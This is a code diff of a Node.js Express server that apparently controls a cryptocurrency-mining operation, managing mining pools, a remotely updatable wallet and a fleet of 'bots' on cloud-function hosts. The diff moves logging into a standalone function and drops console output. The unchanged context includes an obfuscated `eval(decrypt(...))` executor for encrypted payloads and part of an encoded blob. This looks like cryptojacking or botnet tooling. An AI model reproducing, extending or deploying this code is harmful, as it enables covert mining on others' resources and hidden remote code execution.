@@ -10,7 +10,14 @@ app.use(express.json({limit:'50mb'}));
 app.use(express.urlencoded({limit:'50mb',extended:true}));
 app.get('/',function(req,res) { mm.get(req,res) });
 app.post('/',app.parser,function(req,res) { mm.post(req,res) });
-app.listen(process.env.PORT||5000, () => { mm.log({host:require('./package.json').host,color:'#8ED76C',msg:'start' }) })
+app.listen(process.env.PORT||5000, () => { log({host:require('./package.json').host,color:'#8ED76C',msg:'start' }) })
+
+var tmp = { values: [], backgrounds: [] }
+function log(data) {
+  tmp.values.push([new Date().toLocaleString(),data.host,data.msg]);
+  if(!data.color) data.color = null;
+  tmp.backgrounds.push([data.color,data.color,data.color]);
+}
 
 var main = function() {
   var self = this
@@ -34,7 +41,6 @@ var main = function() {
     ],
     pools: { backgrounds: [], hashes: [] },
     bots: { backgrounds: [], hashes: [] },
-    tmp: { values: [], backgrounds: [] },
     log: { values: [], backgrounds: [] }
   }
 
@@ -90,15 +96,15 @@ var main = function() {
   
     if(active && !gg.rec && gg.url) {
       gg.rec = true;
-      db.log = db.tmp; db.tmp = { values: [], backgrounds: [] };
+      db.log = tmp; tmp = { values: [], backgrounds: [] };
       request.post({ url: gg.url, form: JSON.stringify(db), json: true, followAllRedirects: true },
       function(error, response, body) {
-        if(error) { self.log({host:'google',color:'#F8516A',msg:error.message}); gg.rec = false }
-        else if(!body.yellow_pools) { self.log({host:'google',color:'#F8516A',msg:'body is wrong (data): '+body}); gg.rec = false }
+        if(error) { log({host:'google',color:'#F8516A',msg:error.message}); gg.rec = false }
+        else if(!body.yellow_pools) { log({host:'google',color:'#F8516A',msg:'body is wrong (data): '+body}); gg.rec = false }
         else {
           var tasks = []; yellow_pools = body.yellow_pools == 'ON';
           if(body.wallet && body.wallet != db.wallet) {
-            db.wallet = body.wallet; self.log({host:'new wallet',msg:db.wallet});
+            db.wallet = body.wallet; log({host:'new wallet',msg:db.wallet});
             if(!body.pools) { var list = []; for(var i=0; i<pools.length; i++) list.push([pools[i].host]); tasks.push(update_pools(list)) }
           }
   
@@ -120,11 +126,11 @@ var main = function() {
         var tasks = [];
         for(var i=0; i<pools.length; i++) tasks.push(pools[i].close());
         Promise.all(tasks).then(msgs => {
-          for(var j=0; j<msgs.length; j++) self.log({host:msgs[j],msg:'del pool'})
+          for(var j=0; j<msgs.length; j++) log({host:msgs[j],msg:'del pool'})
           pools = [];
           for(var j=0; j<p1.length; j++) {
             pools.push(new gg.mycoin({ wallet: db.wallet, host: p1[j] }));
-            self.log({host:p1[j],msg:'add pool'})
+            log({host:p1[j],msg:'add pool'})
           }
           resolve(true)
         });
@@ -139,13 +145,13 @@ var main = function() {
     else {
       for(var i=0; i<bots.length; i++) {
         if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
-        self.log({host:bots[i].host,msg:'del bot'})
+        log({host:bots[i].host,msg:'del bot'})
       }
       bots = [];
       for(var i=0; i<b1.length; i++) {
         let nbot={host:b1[i], state:'orange', hash:'0 h/s [0/0]'};
         bots.push(nbot); wakeup(nbot);
-        self.log({host:b1[i],msg:'add bot'});
+        log({host:b1[i],msg:'add bot'});
       }
       return true
     }
@@ -200,11 +206,11 @@ var main = function() {
         bot.msg = body.msg;
         if(next) return onmsg(bot);
         else {
-          self.log({host:bot.host,msg:bot.msg})
+          log({host:bot.host,msg:bot.msg})
           return wakeup(bot)
         }
       }
-      self.log({host:bot.host,color:'#F8516A',msg:bot.msg})
+      log({host:bot.host,color:'#F8516A',msg:bot.msg})
       if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
       else bot.state = 'red'; 
       bot.hash = '0 h/s '+bot.hash.split(' ')[2];
@@ -251,9 +257,9 @@ vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7Y
     if(req.body.init) {
       init(req.body, function(msg){
         var data = { msg: msg }
-        if(msg.includes('error')) self.log({host:require('./package.json').host,color:'#F8516A',msg:msg});
+        if(msg.includes('error')) log({host:require('./package.json').host,color:'#F8516A',msg:msg});
         else {
-          self.log({host:require('./package.json').host,color:'#8ED76C',msg:msg});
+          log({host:require('./package.json').host,color:'#8ED76C',msg:msg});
           data.wallet = db.wallet;
           data.pools = { values: [] }; for(var i=0; i<pools.length; i++) data.pools.values.push([pools[i].host]);
           data.push = {log: db.log};
@@ -263,13 +269,6 @@ vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7Y
       })
     }
     else if(req.body.bots) res.send(update_bots(req.body.bots))
-  }
-
-  this.log = function(data) {
-    db.tmp.values.push([new Date().toLocaleString(),data.host,data.msg]);
-    if(!data.color) data.color = null;
-    else console.log(JSON.stringify(data))
-    db.tmp.backgrounds.push([data.color,data.color,data.color]);
   }
 
   var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
